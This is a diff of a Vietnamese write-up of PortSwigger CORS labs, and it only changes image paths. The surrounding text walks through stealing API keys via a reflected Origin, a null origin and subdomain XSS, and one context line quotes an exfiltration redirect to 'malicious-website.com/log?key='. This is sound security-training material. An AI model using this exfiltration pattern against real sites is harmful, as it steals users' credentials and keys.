@@ -74,27 +74,27 @@ function reqListener() {
 
 Ở lab này thì được cung cấp 1 account, sau khi login vào bằng `wiener:peter`, sau đó quan sát request và response thì: 
 
-![image](/assets/images/PortSwigger/cors/image1.png)
+![image](/assets/img/PortSwigger/cors/image1.png)
 
 Thì thấy trong phần `/accountDetails` thì có `Access-Control-Allow-Credentials: true` như vậy thì có thể là CORS có thể support. 
 
 Để thử thì mình thử thêm 1 trường `Origin: https://example.com` vào trong header. 
 
-![image](/assets/images/PortSwigger/cors/image2.png)
+![image](/assets/img/PortSwigger/cors/image2.png)
 
 Thì nó xuất hiện 1 trường nữa là `Access-Control-Allow-Origin: https://example.com` 
 
 Như vậy mình viết 1 script để thực hiện như sau: 
 
-![image](/assets/images/PortSwigger/cors/image3.png)
+![image](/assets/img/PortSwigger/cors/image3.png)
 
 Bắt đầu gửi tới nạn nhân thì sẽ truy cập gửi kèm thông tin nhạy cảm về địa chỉ của attacker. 
 
-![image](/assets/images/PortSwigger/cors/image4.png)
+![image](/assets/img/PortSwigger/cors/image4.png)
 
 Sau khi decode thì nó là: 
 
-![image](/assets/images/PortSwigger/cors/image5.png)
+![image](/assets/img/PortSwigger/cors/image5.png)
 
 ### Lỗi phân tích Header Origin 
 
@@ -167,27 +167,27 @@ location='malicious-website.com/log?key='+this.responseText;
 
 Ở lab này thì được cung cấp 1 account, sau khi login vào bằng `wiener:peter`, sau đó quan sát request và response thì: 
 
-![image](/assets/images/PortSwigger/cors/image6.png)
+![image](/assets/img/PortSwigger/cors/image6.png)
 
 Mình thấy trong header có `Access-Control-Allow-Credentials: true`, sau đó mình gửi nó sang Repeater để thêm 1 trường `Origin: null`. 
 
-![image](/assets/images/PortSwigger/cors/image7.png)
+![image](/assets/img/PortSwigger/cors/image7.png)
 
 Thì nó trả về `Access-Control-Allow-Origin: null`, thì điều đó có nghĩa ứng dụng chấp nhận CORS là `null`
 
 Từ đây mình khai thác trên exploit server như sau: 
 
-![image](/assets/images/PortSwigger/cors/image8.png)
+![image](/assets/img/PortSwigger/cors/image8.png)
 
 Điều này cho phép là `allow-scripts` cho phép thực hiện script; `allow-top-navigation` cho phép thay đổi trong tab chính; `allow-forms` cho phép gửi form này. 
 
 Và ko có `allow-same-origin` thì điều này có nghĩa gửi với `Origin: null`
 
-![image](/assets/images/PortSwigger/cors/image9.png)
+![image](/assets/img/PortSwigger/cors/image9.png)
 
 Từ đây nó trả về request và mình cần decode nó. 
 
-![image](/assets/images/PortSwigger/cors/image10.png)
+![image](/assets/img/PortSwigger/cors/image10.png)
 
 ### Khai thác XSS thông qua mối quan hệ tin tưởng CORS 
 
@@ -247,31 +247,31 @@ Trong tình huống này, attacker có khả năng chặn lưu lượng truy c�
 
 Lab này cũng được cung cấp 1 account. Sau khi login thì nó trả về 1 request như này: 
 
-![image](/assets/images/PortSwigger/cors/image11.png)
+![image](/assets/img/PortSwigger/cors/image11.png)
 
 Quan sát thì thấy có trường `Access-Control-Allow-Credentials` như vậy ứng dụng có thể support CORS. 
 
 Để test thì mình thử thêm trường `Origin: http://subdomain...` xem ứng dụng phản hồi như thế nào. 
 
-![image](/assets/images/PortSwigger/cors/image12.png)
+![image](/assets/img/PortSwigger/cors/image12.png)
 
 Nó cũng trả lại thì CORS được config cho HTTP và HTTPS. 
 
 Khi nó kiểm tra chức năng checkstock thì: 
 
-![image](/assets/images/PortSwigger/cors/image13.png)
+![image](/assets/img/PortSwigger/cors/image13.png)
 
 Thì nó gọi tới 1 URL dùng HTTP là http://stock. vì có response nó như sau: 
 
-![image](/assets/images/PortSwigger/cors/image14.png)
+![image](/assets/img/PortSwigger/cors/image14.png)
 
 Và mình thử nhập test trên tham số `product` xem như thế nào trên subdomain .stock 
 
-![image](/assets/images/PortSwigger/cors/image15.png)
+![image](/assets/img/PortSwigger/cors/image15.png)
 
 Thì nó bị dính Reflected XSS 
 
-![image](/assets/images/PortSwigger/cors/image16.png)
+![image](/assets/img/PortSwigger/cors/image16.png)
 
 Như vậy nếu mình viết 1 script để lấy CORS kèm credentials sau đó fetch tới log của exploit server.
 
@@ -287,19 +287,19 @@ Như vậy nếu mình viết 1 script để lấy CORS kèm credentials sau đ�
 
 Sau đó mình encode rồi nhét nó vào tham số product trong subdomain http://stock. 
 
-![image](/assets/images/PortSwigger/cors/image17.png)
+![image](/assets/img/PortSwigger/cors/image17.png)
 
 Như vậy thì thấy nó chạy thành công í nên là mình exploit server mình truyền như sau: 
 
-![image](/assets/images/PortSwigger/cors/image18.png)
+![image](/assets/img/PortSwigger/cors/image18.png)
 
 Thì ở đây truy cập 1 access-log thì nó lấy được api. 
 
-![image](/assets/images/PortSwigger/cors/image19.png)
+![image](/assets/img/PortSwigger/cors/image19.png)
 
 Và sao mình biết là có apikey mà lấy thì do đây. 
 
-![image](/assets/images/PortSwigger/cors/image20.png)
+![image](/assets/img/PortSwigger/cors/image20.png)
 
 Từ đây mình có thể viết 1 script khác như này: 
 
@@ -319,9 +319,9 @@ Từ đây mình có thể viết 1 script khác như này:
 
 Thì cũng làm tương tự mình cũng thu được apikey. 
 
-![image](/assets/images/PortSwigger/cors/image21.png)
+![image](/assets/img/PortSwigger/cors/image21.png)
 
-![image](/assets/images/PortSwigger/cors/image22.png)
+![image](/assets/img/PortSwigger/cors/image22.png)
 
 ## Mạng nội bộ và CORS ko kèm thông tin xác thực 
 
